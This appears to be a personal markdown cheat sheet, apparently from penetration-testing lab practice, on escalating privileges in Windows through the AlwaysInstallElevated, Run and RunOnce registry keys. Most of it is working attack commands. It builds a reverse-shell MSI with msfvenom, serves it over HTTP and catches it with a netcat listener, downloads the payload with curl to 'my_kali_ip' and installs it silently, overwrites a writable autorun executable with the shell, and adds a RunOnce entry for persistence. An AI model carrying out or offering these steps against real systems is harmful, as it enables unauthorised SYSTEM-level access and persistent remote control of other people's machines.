# **WIndows Privilege Escalation via Registry**

## **AlwaysInstallElevated Registry**
---

### Check this registry for HKLM (Hive Key Local Machine)
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
#### Output should be like 
```
AlwaysInstallElevated     REG_DWORD  0x1  [true]
DisableMSI                REG_DWORD  0x0  [flase]
``` 

### Check this registry for HKCU (Hive Key Current User)
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```
#### Output should be like 
```
AlwaysInstallElevated     REG_DWORD  0x1  [true]
``` 

#### HKLM & HKCU outout should be like that then this technique is worked,otherwise not worked..

### Create a malicious shell.msi & run netcat listener on my kali machine

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f msi > shell.msi

python3 -m http.server 80

nc -nlvp 4444
```

### Now download and run the file in the windows
```
cd Desktop

curl http://my_kali_ip/shell.msi    [download]

msiexec /quiet /i shell.msi        [run]
```

#### when the file is run , get the reverse shell connection to my kali machine & get the system user 


---
## **Run Registry**
---
### Check this registry for HKLM (Hive Key Local Machine)

```
reg query HKLM\SOFTWARE\Microsoft\Windows\Current Version\Run
```

#### Output
```
My Program REG_SZ "c:\Program Files\Autorun Program\Program.exe"
```
### Go to this folder and check the file permission 
```
cd "c:\Program Files\Autorun Program"
dir
echo > program.exe      [gives no error.Write permission of this file]
echo > test.exe         [Access is denied..Can't create any file to this folder]
```

#### Now I should not delete the program.exe and make a new file program.exe which is malicious

### Now append the shell.exe [created for the AlwaysInstallElevated Registry ] to this program.exe
```
curl http://my_kali_ip/shell.exe -o program.exe
```

#### ==> Now when a user(admin) is login,then program.exe file is run automatically & give the reverse connection shell to my kali machine [running nc listener]



---
## **RunOnce Registry**
---
### Check this registry for HKLM (Hive Key Local Machine)

```
reg query HKLM\SOFTWARE\Microsoft\Windows\Current Version\Runonce
```
#### output: nothing is shown [no files]

### Now try to add a new registry
```
reg add HKLM\SOFTWARE\Microsoft\Windows\Current Version\Runonce /V shell /t REG_SZ /d "c:\Program Files\Autorun Program\Program.exe" /f
```

#### Output: Error[access is denied]
#### Here REG_SZ means string type registry

#### If there have access then when a user(admin) login it automatically run the "c:\Program Files\Autorun Program\Program.exe" and then get the reverse shell to my kali machine & then it will remove this "c:\Program Files\Autorun Program\Program.exe" file..